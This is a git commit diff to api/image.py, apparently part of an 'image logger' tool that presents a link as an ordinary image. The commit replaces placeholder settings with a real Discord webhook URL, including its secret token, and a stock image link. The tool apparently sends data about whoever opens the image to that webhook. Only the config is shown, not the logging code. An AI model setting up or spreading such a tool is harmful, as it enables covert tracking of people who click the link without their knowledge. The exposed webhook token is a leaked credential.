edcc29f0ec9186535a1fa65cdc9a66411c16f516
4wthylol-crypto <4wthylol@gmail.com>
2026-03-15 00:33:03 -0600

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1482620513263030413/8PKmMSl94Ii998ENkOhXYx0hq9UT0ipUJBd3P7FU9iU6QobZYs8KHLVUzIYSOOU8tdVA",
+    "image": "https://t4.ftcdn.net/jpg/02/48/96/11/360_F_248961156_XeSISXFo6bcFUw830wpE2zPLxWGCl1u9.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
